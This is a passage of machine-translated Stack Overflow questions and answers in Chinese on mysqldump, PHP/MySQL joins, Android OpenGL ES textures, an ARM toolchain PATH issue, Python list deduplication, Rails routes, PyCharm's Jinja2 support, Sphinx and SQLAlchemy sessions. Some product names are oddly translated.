mysqldump --tab=/path/to/serverlocaldir --single-transaction <database> table_a 
```

这会产生两个文件：

*   `table_a.sql`仅包含表创建语句；和
*   `table_a.txt`包含制表符分隔的数据。

## 恢复

您可以通过以下方式恢复您的表格`LOAD DATA`：

```
LOAD DATA INFILE '/path/to/serverlocaldir/table_a.txt' 
  INTO TABLE table_a FIELDS TERMINATED BY '\t' ... 
```

LOAD DATA 通常比使用 INSERT 语句快 20 倍。

如果您必须将数据恢复到另一个表中（例如，出于审查或测试目的），您可以创建一个“镜像”表：

```
CREATE TABLE table_for_test LIKE table_a; 
```

然后将 CSV 加载到新表中：

```
LOAD DATA INFILE '/path/to/serverlocaldir/table_a.txt' 
  INTO TABLE table_for_test FIELDS TERMINATED BY '\t' ... 
```

## 比较

`Excel`CSV 文件最适合用于差异或查看内部，或者对于可以使用常用工具（如、`Access`或命令行（`diff`、`comm`等）的非 SQL 技术用户）

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2013-04-02T06:50:40.480

恐怕这不可能。在旧的 MySQL Administrator 中，我编写了用于转储 db 对象的代码，它完全独立于 mysqldump 工具，因此提供了许多附加选项（例如这种格式或进度反馈）。在 MySQL Workbench 中，决定使用 mysqldump 工具来代替，除了在某些方面倒退和产生版本问题外，它还具有始终与服务器保持同步的优势。

所以简短的回答是：目前无法使用 mysqldump 进行格式化。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2019-07-26T23:15:28.387

试试这个：

```
mysqldump -c -t --add-drop-table=FALSE --skip-extended-insert -uroot -p<Password> databaseName tableName >c:\path\nameDumpFile.sql 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2015-03-06T05:38:13.870

我发现这个工具对处理扩展插入非常有帮助：http: [//blog.lavoie.sl/2014/06/split-mysqldump-extended-inserts.html](http://blog.lavoie.sl/2014/06/split-mysqldump-extended-inserts.html)

它解析 mysqldump 输出并在每条记录后插入换行符，但仍使用更快的扩展插入。与 sed 脚本不同，如果正则表达式恰好在字符串中匹配，则不应该有任何在错误位置换行的风险。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2016-02-02T14:54:48.090

我喜欢 Ace.Di 的 sed 解决方案，直到我收到此错误：sed: Couldn't re-allocate memory

因此我不得不写一个小的 PHP 脚本

```
mysqldump -u my_db_user -p -h 127.0.0.1 --skip-extended-insert my_database | php mysqlconcatinserts.php > db.sql 
```

PHP 脚本还为每 10.000 行生成一个新的 INSERT，再次避免内存问题。

mysqlconcatinserts.php：

```
#!/usr/bin/php
<?php
/* assuming a mysqldump using --skip-extended-insert */
$last = '';
$count = 0;
$maxinserts = 10000;
while($l = fgets(STDIN)){
  if ( preg_match('/^(INSERT INTO .* VALUES) (.*);/',$l,$s) )
  {
    if ( $last != $s[1] || $count > $maxinserts )
    {
      if ( $count > $maxinserts ) // Limit the inserts
        echo ";\n";
      echo "$s[1] ";
      $comma = ''; 
      $last = $s[1];
      $count = 0;
    }
    echo "$comma$s[2]";
    $comma = ",\n";
  } elseif ( $last != '' ) {
    $last = '';
    echo ";\n";
  }
  $count++;
} 
```

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2020-05-22T08:45:32.720

添加

```
set autocommit=0; 
```

到您的 sql 脚本文件的第一行，然后通过以下方式导入：

```
mysql -u<user> -p<password> --default-character-set=utf8 db_name < <path>\xxx.sql 
```

，它会快 10 倍。

# ios - 是否可以在具有自定义参数的 IOS 上创建网站的主页图标

> ID：15750537
> 
> 赞同：0
> 
> 时间：2013-04-01T19:43:21.803
> 
> 标签：ios, iphone, ipad, web, safari

经过研究，我找到了“添加到主屏幕”选项的方法，但这只会为默认网站创建书签。我也想包含某些参数。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T20:00:06.510

据我所知，您不能强制使用网络剪辑的 URL，[这是一年前提出的](https://stackoverflow.com/questions/7014431/create-web-clip-for-different-url)。

您可以查看[iOS Safari Web 内容指南：配置 Web 应用程序](https://developer.apple.com/library/ios/#documentation/AppleApplications/Reference/SafariWebContent/ConfiguringWebApplications/ConfiguringWebApplications.html#//apple_ref/doc/uid/TP40002051-CH3-SW3)以获取有关您可以编辑的内容的更多信息。

# php - PHP+MySQL:- 从父 ID 行获取标题

> ID：15750540
> 
> 赞同：2
> 
> 时间：2013-04-01T19:43:29.667
> 
> 标签：php, mysql

您好，这是我在这里的第一个问题。我是 php mysql 的新手，希望能得到各位专家的帮助。

如果 type="C" 有音频文件，我有一个博客表并试图获取标题。表格详情请参考图片

这是图片 [http://i.stack.imgur.com/XK9Cr.jpg](http://i.stack.imgur.com/XK9Cr.jpg)

我可以写一些简单的查询，但这对我来说很复杂，要理解如何在检查是否`C`有音频文件而不是 null时获得标题

询问： `"SELECT * FROM blogpost WHERE type='P' AND audio IS NOT NULL";`

这显然不会渲染任何东西，这是我的困惑，我该如何编写查询，它将`C`以这种方式确定，`"SELECT * FROM blogpost WHERE type='C' AND audio IS NOT NULL";`但比这里我如何获得标题`P`？

谁能帮我获得`P`类型的标题。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-01T19:46:42.700

您需要再次加入，`blogpost`以便为父母和孩子提供一张桌子。

```
SELECT p.title FROM blogpost p
JOIN blogpost c ON (p.postid = c.Parentid)
WHERE c.blogtype = 'C' AND c.audio IS NOT NULL
AND p.blogtype = 'P' 
```

最后一行可能不是必需的；只有当`C`可以是父母`C`并且你想排除那些。

# android - Android OpenGL|ES 2.0 纹理

> ID：15750542
> 
> 赞同：1
> 
> 时间：2013-04-01T19:43:46.053
> 
> 标签：android, textures, opengl-es-2.0

我正在使用 OpenGL|ES 2.0 创建一个简单的 2D 正方形。我正在努力让纹理正常工作。请在这方面帮助我。我附上了下面的代码：

GFXUtils：

```
public class GFXUtils {
    public static final String TAG = "GFXUtils";    
    public static final int COORDS_PER_VERTEX = 3;
    public static final int COORDS_PER_TEXTURE = 2;
    public static int vertexStride = COORDS_PER_VERTEX * 4; // bytes per vertex
    public static int textureStride = COORDS_PER_TEXTURE * 4; // bytes per vertex

    public static Context Context = null;
    public static SparseIntArray textures = new SparseIntArray();

    public static int loadShader(int type, String shaderCode){

        // create a vertex shader type (GLES20.GL_VERTEX_SHADER)
        // or a fragment shader type (GLES20.GL_FRAGMENT_SHADER)
        int shader = GLES20.glCreateShader(type);

        // add the source code to the shader and compile it
        GLES20.glShaderSource(shader, shaderCode);
        GLES20.glCompileShader(shader);

        return shader;
    }

    public static void checkGlError(String glOperation) {
        int error;
        while ((error = GLES20.glGetError()) != GLES20.GL_NO_ERROR) {
            Log.e(TAG, glOperation + ": glError " + error);
            throw new RuntimeException(glOperation + ": glError " + error);
        }
    }

    public static void loadTexture(final int resourceId)
    {
        final int[] textureHandle = new int[1];

        GLES20.glGenTextures(1, textureHandle, 0);

        if (textureHandle[0] != 0)
        {
            final BitmapFactory.Options options = new BitmapFactory.Options();
            options.inScaled = false;   // No pre-scaling

            // Read in the resource
            final Bitmap bitmap = BitmapFactory.decodeResource(Context.getResources(), resourceId, options);

            // Bind to the texture in OpenGL
            GLES20.glBindTexture(GLES20.GL_TEXTURE_2D, textureHandle[0]);

            // Set filtering
            GLES20.glTexParameteri(GLES20.GL_TEXTURE_2D, GLES20.GL_TEXTURE_MIN_FILTER, GLES20.GL_NEAREST);
            GLES20.glTexParameteri(GLES20.GL_TEXTURE_2D, GLES20.GL_TEXTURE_MAG_FILTER, GLES20.GL_NEAREST);

            GLES20.glTexParameterf(GLES20.GL_TEXTURE_2D, GLES20.GL_TEXTURE_WRAP_S, GLES20.GL_CLAMP_TO_EDGE); 
            GLES20.glTexParameterf(GLES20.GL_TEXTURE_2D, GLES20.GL_TEXTURE_WRAP_T, GLES20.GL_CLAMP_TO_EDGE);

            // Load the bitmap into the bound texture.
            GLUtils.texImage2D(GLES20.GL_TEXTURE_2D, 0, bitmap, 0);

            // Recycle the bitmap, since its data has been loaded into OpenGL.
            bitmap.recycle();
        }

        if (textureHandle[0] == 0)
        {
            throw new RuntimeException("Error loading texture.");
        }

        textures.append(resourceId, textureHandle[0]);      
    }
} 
```

顶点：

```
public class Vertex
{
    public FloatBuffer floatBuffer; // buffer holding the vertices
    public ShortBuffer indexBuffer;
    public int numVertices;
    public int numIndeces;

    //public float vertex[];

    public Vertex (float[] vertex, int coordsPerVertex)
    {
        //this.vertex = vertex;
        this.setVertices(vertex, coordsPerVertex);
    }

    public Vertex (float[] vertex, short[] indices, int coordsPerVertex)
    {
        //this.vertex = vertex;
        this.setVertices(vertex, coordsPerVertex);
        this.setIndices(indices);
    }

    private void setVertices(float vertex[], int coordsPerVertex)
    {
        // a float has 4 bytes so we allocate for each coordinate 4 bytes
        ByteBuffer factory = ByteBuffer.allocateDirect (vertex.length * 4);
        factory.order (ByteOrder.nativeOrder ());
        // allocates the memory from the byte buffer
        floatBuffer = factory.asFloatBuffer ();
        // fill the vertexBuffer with the vertices
        floatBuffer.put (vertex);
        // set the cursor position to the beginning of the buffer
        floatBuffer.position (0);
        numVertices = vertex.length / coordsPerVertex;
    }

    protected void setIndices(short[] indices) {
        ByteBuffer ibb = ByteBuffer.allocateDirect(indices.length * 2);
        ibb.order(ByteOrder.nativeOrder());
        indexBuffer = ibb.asShortBuffer();
        indexBuffer.put(indices);
        indexBuffer.position(0);
        numIndeces = indices.length;
    }
} 
```

**更新**广场：

```
public class Square{

    private static final String TAG = "Square";

    public float[] rotation = {0.0f,0.0f,45.0f};
    public float[] scale = {100.0f,100f,100f};
    public float[] position = {0.0f,0.0f,100f};
    public float[] color = { 0.0f, 0.0f, 1.0f, 1.0f };

    private int textureRef = -1;

    private int mMVPMatrixHandle;

    protected int DRAW_MODE = GLES20.GL_TRIANGLES;
    protected int mProgram; 
    protected int mPositionHandle;
    protected Vertex vertices;
    protected Vertex texture;

    private int mColorHandle;

    private int vsTextureCoord;
    private int fsTexture;  

    protected float[] result_matrix = new float[16];    

    private final String vertexShaderCode =
            "uniform mat4 uMVPMatrix;" +
                    "attribute vec4 vPosition;" +
                    "attribute vec2 TexCoordIn;" +
                    "varying vec2 TexCoordOut;" +
                    "void main() {" +
                    //the matrix must be included as a modifier of gl_Position
                    "  gl_Position = uMVPMatrix * vPosition;" +
                    "  TexCoordOut = TexCoordIn;" +
                    "}";

    private final String fragmentShaderCode =
            "precision mediump float;" +
                    "uniform vec4 vColor;" +
                    "uniform sampler2D Texture;" +
                    "varying lowp vec2 TexCoordOut;" +                             
                    "void main() {" +                   
                    "  gl_FragColor = vColor;" +
                    "}";    
    //I am fully aware that I am not using the texture by assigning the colour, but until I can actually SEND the texture through, there would be no point.
    static float squareCoords[] = { -0.5f,  0.5f, 0.0f,   // top left
                                    -0.5f, -0.5f, 0.0f,   // bottom left
                                     0.5f, -0.5f, 0.0f,   // bottom right
                                     0.5f,  0.5f, 0.0f }; // top right

    private short drawOrder[] = { 0, 1, 2, 0, 2, 3 }; // order to draw vertices

    public Square(int textureResourceId) {

        int vertexShader = GFXUtils.loadShader(GLES20.GL_VERTEX_SHADER, vertexShaderCode);
        int fragmentShader = GFXUtils.loadShader(GLES20.GL_FRAGMENT_SHADER, fragmentShaderCode);

        mProgram = GLES20.glCreateProgram();             // create empty OpenGL ES Program
        GLES20.glAttachShader(mProgram, vertexShader);   // add the vertex shader to program
        GLES20.glAttachShader(mProgram, fragmentShader); // add the fragment shader to program
        GLES20.glLinkProgram(mProgram);                  // creates OpenGL ES program executables
        textureRef = GFXUtils.textures.get(textureResourceId);

        // initialize vertex byte buffer for shape coordinates
        vertices = new Vertex(squareCoords, drawOrder, GFXUtils.COORDS_PER_VERTEX);

        texture = new Vertex (new float[]
                {               
                    1.0f, 0.0f,
                    0.0f, 0.0f,
                    1.0f, 1.0f,
                    0.0f, 1.0f,
                }, GFXUtils.COORDS_PER_TEXTURE);   

        DRAW_MODE = GLES20.GL_TRIANGLE_FAN;
    }

    private void getHandles()
    {

        //get handle to vertex shader's vPosition member
        mPositionHandle = GLES20.glGetAttribLocation(mProgram, "vPosition");
        if (mPositionHandle == -1) Log.e(TAG, "vPosition not found");
        //get handle to fragment shader's vColor member
        mColorHandle = GLES20.glGetUniformLocation(mProgram, "vColor");
        if (mColorHandle == -1) Log.e(TAG, "vColor not found");

        //get handle to shape's transformation matrix
        mMVPMatrixHandle = GLES20.glGetUniformLocation(mProgram, "uMVPMatrix");
        if (mMVPMatrixHandle == -1) Log.e(TAG, "uMVPMatrix not found");

        //get handle to texture coordinate variable
        vsTextureCoord = GLES20.glGetAttribLocation(mProgram, "TexCoordIn");
        if (vsTextureCoord == -1) Log.e(TAG, "TexCoordIn not found");

        //get handle to shape's texture reference
        fsTexture = GLES20.glGetUniformLocation(mProgram, "Texture");
        if (fsTexture == -1) Log.e(TAG, "Texture not found");

    }

    private void translateRotateScale(float[] matrix, float[] perspectiveMatrix)
    {       
        for (int i= 0; i < perspectiveMatrix.length;i++)
            matrix[i] = perspectiveMatrix[i];

        Matrix.translateM(matrix, 0, position[0], position[1], position[2]);
        Matrix.rotateM(matrix, 0, rotation[0], 1.0f, 0.0f, 0.0f);
        Matrix.rotateM(matrix, 0, rotation[1], 0.0f, 1.0f, 0.0f);
        Matrix.rotateM(matrix, 0, rotation[2], 0.0f, 0.0f, 1.0f);
        Matrix.scaleM(matrix, 0, scale[0], scale[1], scale[2]);            
    }

    public void draw(float[] mvpMatrix) {
        rotation[2]+=0.5;
        // Add program to OpenGL ES environment
        GLES20.glUseProgram(mProgram);
        GFXUtils.checkGlError("using program");

        //Housekeeping
        getHandles();
        translateRotateScale(result_matrix, mvpMatrix);
        //end housekeeping

        // Set color for drawing the shape
        GLES20.glUniform4fv(mColorHandle, 1, color, 0);     

        // Apply the projection and view transformation
        GLES20.glUniformMatrix4fv(mMVPMatrixHandle, 1, false, result_matrix, 0);
        GFXUtils.checkGlError("glUniformMatrix4fv");

        // Prepare the shape coordinate data
        GLES20.glVertexAttribPointer(mPositionHandle, GFXUtils.COORDS_PER_VERTEX,
                GLES20.GL_FLOAT, false,
                GFXUtils.vertexStride, vertices.floatBuffer);
        GFXUtils.checkGlError("load vertex buffer");

        GLES20.glVertexAttribPointer(vsTextureCoord, GFXUtils.COORDS_PER_TEXTURE,
                GLES20.GL_FLOAT, false, 
                GFXUtils.textureStride, texture.floatBuffer);
        GFXUtils.checkGlError("load texture buffer - " + vsTextureCoord);

        // Enable a handle to the shape vertices
        GLES20.glEnableVertexAttribArray(mPositionHandle);
        GFXUtils.checkGlError("enable position handle");
        GLES20.glEnableVertexAttribArray(vsTextureCoord);
        GFXUtils.checkGlError("enable texture handle");

        GLES20.glActiveTexture(GLES20.GL_TEXTURE0);
        GFXUtils.checkGlError("activtexture");
        GLES20.glBindTexture(GLES20.GL_TEXTURE_2D, textureRef);
        GFXUtils.checkGlError("bindtexture");
        GLES20.glUniform1i(fsTexture, 0);
        GFXUtils.checkGlError("uniformi");
        //Draw the shape
        GLES20.glDrawElements(DRAW_MODE, vertices.numIndeces, GLES20.GL_UNSIGNED_SHORT, vertices.indexBuffer);
        GFXUtils.checkGlError("glDrawArrays with " + vertices.numVertices + " vertices");

        //Disable vertex array
        GLES20.glDisableVertexAttribArray(vsTextureCoord);
        GLES20.glDisableVertexAttribArray(mPositionHandle);
        GFXUtils.checkGlError("glDisableVertexAttribArray for position");

    }
} 
```

**更新**但它现在找不到 fsTexture 的“纹理”sampler2D 参数。图片在这里：

![在此处输入图像描述](https://i.stack.imgur.com/7j1mJ.png)

我看过以下内容：

[Android：OpenGL ES 2.0 - 纹理始终为黑色](https://stackoverflow.com/questions/11507040/android-opengl-es-2-0-texture-always-black)
[使用纹理绘制多个对象](https://stackoverflow.com/questions/12685939/draw-multiple-objects-with-textures)
[Android OpenGLES 2.0 纹理映射不起作用](https://stackoverflow.com/questions/15329218/android-opengles-2-0-texture-mapping-does-not-work)
[Android 的 OpenGL ES 2.0 中的纹理](https://stackoverflow.com/questions/6197081/textures-in-opengl-es-2-0-for-android)
[http://www.learnopengles.com/android-lesson-six-an-introduction-to -texture-filtering/](http://www.learnopengles.com/android-lesson-six-an-introduction-to-texture-filtering/)
[http://www.learnopengles.com/android-lesson-four-introducing-basic-texturing/](http://www.learnopengles.com/android-lesson-four-introducing-basic-texturing/)
[http://blog.shayanjaved.com/2011/05/13/android-opengl-es-2 -0-render-to-texture/](http://blog.shayanjaved.com/2011/05/13/android-opengl-es-2-0-render-to-texture/)
[http://www.raywenderlich.com/4404/opengl-es-2-0-for-iphone-tutorial-part-2-textures](http://www.raywenderlich.com/4404/opengl-es-2-0-for-iphone-tutorial-part-2-textures)
[http://androgeek.info/?p =167](http://androgeek.info/?p=167)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T21:51:19.060

好的，那么这是我对解决方案的猜测：

*   glVertexAttribPointer() 调用似乎很好

*   **我的猜测**：

    vsTextureCoord == -1

    如果未找到该属性，glGetAttribLocation() 不会生成错误。您必须检查结果是否不是 -1 以确保一切正常。

    问题的根源可能是着色器中的属性 TexCoordIn 是 vec4！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-03T01:48:50.337

floatBuffer 应该包含该数组中第一个元素的地址。glVertexAttribPointer 之后出现错误，因为最后一个参数没有指向顶点数据。直接的解决方案是使 floatbuffer = &vertexdata

我的建议是使用 glGenBuffer、glBindBuffer、glBufferData 将顶点数据放入 gl_array_buffer。之后，只需使用 0 作为最后一个参数绑定 glVertexAttribPointer 之前的缓冲区。这比使用顶点的地址快

# linux - arm-none-eabi 命令将无法正确安装

> ID：15750545
> 
> 赞同：0
> 
> 时间：2013-04-01T19:43:55.823
> 
> 标签：linux, makefile, raspberry-pi

我正在尝试在树莓派上安装汇编代码的工具链。我使用以下过程安装包文件：

```
$ wget http://www.cl.cam.ac.uk/freshers/raspberrypi/tutorials/os/downloads/arm-none-eabi.tar.bz2
--2012-08-16 18:26:29--  http://www.cl.cam.ac.uk/freshers/raspberrypi/tutorials/os/downloads/arm-none-eabi.tar.bz2
Resolving www.cl.cam.ac.uk (www.cl.cam.ac.uk)... 128.232.0.20, 2001:630:212:267::80:14
Connecting to www.cl.cam.ac.uk (www.cl.cam.ac.uk)|128.232.0.20|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 32108070 (31M) [application/x-bzip2]
Saving to: `arm-none-eabi.tar.bz2'

100%[======================================>] 32,108,070   668K/s   in 67s

2012-08-16 18:27:39 (467 KB/s) - `arm-none-eabi.tar.bz2' saved [32108070/32108070]

$ tar xjvf arm-none-eabi.tar.bz2
arm-2008q3/arm-none-eabi/
arm-2008q3/arm-none-eabi/lib/
arm-2008q3/arm-none-eabi/lib/libsupc++.a
arm-2008q3/arm-none-eabi/lib/libcs3arm.a
...
arm-2008q3/share/doc/arm-arm-none-eabi/info/gprof.info
arm-2008q3/share/doc/arm-arm-none-eabi/info/cppinternals.info
arm-2008q3/share/doc/arm-arm-none-eabi/LICENSE.txt

$ export PATH=$PATH:$HOME/arm-2008q3/bin 
```

这似乎有效，包文件在正确的位置。

```
 ~/arm-2008q3/bin $ ls
arm-none-eabi-addr2line  arm-none-eabi-gcc-4.3.2  arm-none-eabi-objdump
arm-none-eabi-ar         arm-none-eabi-gcov       arm-none-eabi-ranlib
arm-none-eabi-as         arm-none-eabi-gdb        arm-none-eabi-readelf
arm-none-eabi-c++        arm-none-eabi-gdbtui     arm-none-eabi-run
arm-none-eabi-c++filt    arm-none-eabi-gprof      arm-none-eabi-size
arm-none-eabi-cpp        arm-none-eabi-ld         arm-none-eabi-sprite
arm-none-eabi-g++        arm-none-eabi-nm         arm-none-eabi-strings
arm-none-eabi-gcc        arm-none-eabi-objcopy    arm-none-eabi-strip 
```

但是，当我去制作时，我得到以下结果。

```
arm-none-eabi-as -I source/ source/main.s -o build/main.o
make: arm-none-eabi-as: Command not found
make: *** [build/main.o] Error 127 
```

提前感谢您的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T08:44:07.217

export PATH=$PATH:$HOME/arm-2008q3/bin 仅在执行它的 shell 中有效（以及从该 shell 生成的任何 shell）。所以你要么使用那个 shell 而不是打开一个新的 shell 来执行 make 或编辑你的 ~/.bashrc （参见[Unix: Getting Export PATH to "Stick"](https://stackoverflow.com/questions/209145/unix-getting-export-path-to-stick)）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-07-05T22:20:05.600

我遇到了同样的问题，就我而言，问题是我运行的是 64 位操作系统，而要使用的包是 32 位的。修复方法是安装 i32-libs 包，它允许在 64 位系统上运行 32 位应用程序。

```
# apt-get install ia32-libs 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-04-16T13:43:57.330

您必须将编译器指向正确的路径`arm-none-eabi-as`。你可以这样做

> 导出 PATH=$PATH:/file_path_goes_here/

当你编译时，你应该没有问题，因为编译器现在知道去哪里找了。

# python - 列表列表中的唯一列表，其中第一个和最后一个值是固定的 Python

> ID：15750547
> 
> 赞同：0
> 
> 时间：2013-04-01T19:43:57.057
> 
> 标签：python

我有一份清单；每个列表都有一个规定的第一个和最后一个值。对于每个第一个和最后一个值组合，我想找到唯一列表的总数。唯一性被定义为使得在具有相同第一个和最后一个值组合的列表之间，列表中间（第一个和最后一个值之间）的元素不能重复。

例如，对于以下列表列表；

```
[[2, 5, 7, 12], [2, 5, 10, 12], [2, 3, 12], [3, 34, 4, 6], [3, 4, 6]] 
```

有 2 个第一个和最后一个值组合：[2,...,12] 和 [3,...,6]。一组唯一列表将是：

```
[[2, 5, 7, 12], [2, 3, 12], [3, 34, 4, 6]] 
```

唯一列表的其他组合是可能的，但是我只关心唯一列表的数量。对于上面的示例，组合 [2,...,12] 有 2 个唯一列表，组合 [3,...,6] 有 1 个唯一列表。

在 python 中执行此操作的最佳方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T19:49:27.853

最直接的方法是通过它们的第一个和最后一个值来索引所有列表，然后过滤它们。

您可以通过将所有这些列表添加到所有键都是`(first, last)`元组的字典中来做到这一点。然后你会检查每一个并删除重复项。

一个简单的例子：

```
mapping = defaultdict(list)
for item in target_lists:
   mapping[item[0], item[-1]].append(item)

for k, items in mapping.iteritems():
   mapping[k] = [some_filter_function(v) for v in items] 
```

您必须对此进行一些修改以设置您的条件以决定它是否重复（我不确定我是否理解您的标准）。

希望能帮助到你！

**更新**：

我想我理解你的标准。您需要做的是跟踪列表中的哪些元素多次出现。然后您浏览列表，检查您制作的记录（仅记录一次）是否存在不应该存在的元素。如果有，则丢弃该元素。一种方法与此类似：

```
for k, items in mapping.iteritems():
    count_item = defaultdict(int)
    for item in items:
        for i in item[1:-1]:
            count_item[i] += 1
    mapping[k] = [item for item in items if all(count_item[i] == 1 for i in item[1:-1])] 
```

这是做到这一点的方法之一。但我几乎可以肯定，您将不得不进行 2 个循环：一个检查要拒绝哪些元素，另一个进行实际过滤。实施可能会有所不同。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T19:59:25.577

怎么样，使用 defaultdict 来跟踪 head+tail ID，并设置为计数唯一条目：

```
from collections import defaultdict

a = [[2, 5, 7, 12], [2, 5, 10, 12], [2, 3, 12], [3, 34, 4, 6], [3, 4, 6]]
dic = defaultdict(lambda: set())
for item in a:
    dic[(item[0], item[-1])].add(tuple(item[1:-1]))

for id, variants in dic.items():
     print "ID %s: %i unique entries" % (str(id), len(variants)) 
```

# ruby-on-rails - 尝试制作表单的网址 /板/ 在 ruby on rails 中并出现错误

> ID：15750549
> 
> 赞同：0
> 
> 时间：2013-04-01T19:43:58.450
> 
> 标签：ruby-on-rails, ruby, rest

我正在使用 ruby​​ on rails 制作一个简单的社交网站，其中包括学生团体每个委员会的不同留言板。我希望每个委员会的 url 结构看起来像这样`https://<base_url>/boards/<committee_name>`，这会将用户带到该委员会的留言板。

我的 routes.rb 文件如下所示：

```
resources :committees, only: [:index] 
match '/boards/:name', to: 'committees#index(name)' 
```

我的 Committees_controller.rb 文件的索引函数如下所示：

```
def index(name)  
   @posts = Committee.where(name: name)  
end 
```

然后我将使用`@posts`页面上的变量来显示所有帖子，但是现在当我导航到时，`https://<base_url>/boards/<committee_name>`我得到一个未知操作错误，它说`The action 'index(name)' could not be found for CommitteesController`。

有人可以指导我完成我做错了什么吗？

一旦我得到这个工作，我将如何制作一个反映这个 url 结构的视图？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T19:53:01.463

像这样设置你的路线：

```
resources :committees, only: [:index]
match '/boards/:name', to: 'committees#show' 
```

和这样的控制器：

```
def index
   @committees = Committee.all
end

def show
   @committee = Committee.find_by_name!(params[:name])
end 
```

您无法像尝试使用的方式将参数真正传递给控制器​​操作`index(name)`。相反，您使用`params`Rails 提供的哈希值。路由声明的`:name`部分告诉 Rails 将任何匹配的内容放入`params[:name]`.

您还应该使用单独的操作来列出委员会并显示单个委员会。按照 Rails 约定，这些应该分别是`index`和`show`动作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T19:52:26.520

路由时，您只指定方法名称，而不是参数：

```
match '/boards/:name', to: 'committees#show' 
```

一般来说，你会声明一些东西，`resources`但`match`不能两者兼而有之。为了保持 REST-ful，这应该是`show`方法。索引是一种`collection`方法，通常不采用任何类型的记录标识符。

参数总是通过`params`结构进入：

```
def show
  @posts = Committee.where(name: params[:name])
end 
```

通过路由公开的控制器方法不带参数。您可以构造`private`为其他目的使用参数的方法。

# python - PyCharm 是否支持 Jinja2？

> ID：15750551
> 
> 赞同：80
> 
> 时间：2013-04-01T19:44:00.840
> 
> 标签：python, jinja2, pycharm

我的一个瓶子项目使用 Jinja2。PyCharm 不会自动识别它并将这些行显示为错误。有没有办法让 Jinja2 工作？

* * *

## 回答 #1

> 赞同：115
> 
> 时间：2013-04-01T19:44:00.840

在专业版中，这些模板语言：

*   神社2
*   姜戈
*   真子

支持。您可以在项目的设置中配置模板语言：

![在 Python 模板设置中，模板语言设置为 Jinja2](https://i.stack.imgur.com/TS8P4.png)

社区版可能缺少某些模板语言。

* * *

## 回答 #2

> 赞同：60
> 
> 时间：2014-03-03T18:36:34.487

我认为值得一提的是，PyCharm 社区版不支持 Jinja2、Mako 和 Django。它仅在 PyCharm Professional 中可用。

看两者的[比较](http://www.jetbrains.com/pycharm/features/editions_comparison_matrix.html)。

* * *

## 回答 #3

> 赞同：31
> 
> 时间：2017-02-01T16:11:49.730

[![在此处输入图像描述](https://i.stack.imgur.com/7X7lU.png)](https://i.stack.imgur.com/7X7lU.png) **是的，来自 pycharm 的专业版确实支持 Jinja2**以使其进入此处

从**文件**打开**设置**并在语言和框架下*搜索***python 模板从那里****选择**Python 模板语言单击 HTML 并选择 Jinja2 作为模板语言。

请查看图片以获得更好的理解。

* * *

## 回答 #4

> 赞同：22
> 
> 时间：2017-10-17T15:43:50.997

如果您使用`.jinja`extension 而不是`.jinja2`，它将不起作用，模板不会突出显示。

您必须将文件扩展名添加到文件类型部分。

*   首选项 > 常规 > 文件类型
*   滚动到 Jinja 2 模板
*   通过单击+注册新模式，添加`*.jinja`

[![在此处输入图像描述](https://i.stack.imgur.com/HyYEX.png)](https://i.stack.imgur.com/HyYEX.png)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-11-18T04:29:22.270

在社区版中，python 模板选项不可用，因此您只需单击底部终端旁边的 python 包即可。这也将添加 Jinja2

# cmusphinx - sphinx 中的一次迭代后麦克风未启动

> ID：15750556
> 
> 赞同：1
> 
> 时间：2013-04-01T19:44:22.993
> 
> 标签：cmusphinx, sphinx4

我正在使用 CMU sphinx 库，但在成功运行一次迭代后，出现此错误“无法打开格式为 PCM_SIGNED 16000.0 Hz、16 位、单声道、2 字节/帧、不支持大端序的麦克风线。” 无法启动麦克风。在 ubuntu 12.10 的 eclipse 上运行时，代码在所有迭代中都能正常工作。为什么在 Windows 7 中使用 eclipse 时会出现此错误？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T21:03:05.413

如果您的配置 xml 文件中有类似的内容：

```
<component name="microphone"
            type="edu.cmu.sphinx.frontend.util.Microphone">
    <property name="closeBetweenUtterances" value="false"/>
</component> 
```

尝试将“false”更改为“true”并重建。

# python - sqlalchemy：为什么在将 sessionmaker 分配给 Session 对象之前创建它？

> ID：15750557
> 
> 赞同：12
> 
> 时间：2013-04-01T19:44:23.357
> 
> 标签：python, session, orm, sqlalchemy

为什么我总是需要在 SqlAlchemy 中分两步执行此操作？

```
import sqlalchemy as sa
import sqlalchemy.orm as orm

engine = sa.create_engine(<dbPath>, echo=True)
Session = orm.sessionmaker(bind=engine)
my_session = Session() 
```

为什么我不能一次性完成（可能更简单，不是吗？）：

```
import sqlalchemy as sa
import sqlalchemy.orm as orm

engine = sa.create_engine(<dbPath>, echo=True)
Session = orm.Session(bind=engine) 
```

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-04-01T20:40:18.513

存在的原因`sessionmaker()`是它需要的各种“配置”参数只需要在一个地方设置，而不是一遍又一遍地重复“bind=engine、autoflush=False、expire_on_commit=False”等。此外，`sessionmaker()`提供了一个“可更新”界面，以便您可以在应用程序的某处进行设置：

```
session = sessionmaker(expire_on_commit=False) 
```

但后来，当您知道您正在与哪个数据库交谈时，您可以为其添加配置：

```
session.configure(bind=create_engine("some engine")) 
```

它还可以作为“可调用”传递给非常常见的`scoped_session()`构造：

```
session = scoped_session(sessionmaker(bind=engine)) 
```

综上所述，这些只是文档引用的约定，以便呈现一致的“如何使用”故事。如果这样更方便，你没有理由不能直接使用构造函数，我一直使用`Session()`构造函数。只是在一个非平凡的应用程序中，您可能最终会将该构造函数调用坚持到`Session()`某种可调用函数内部，`sessionmaker()`作为该可调用函数的默认值。

* * *

## 回答 #2

> 赞同：1
> 
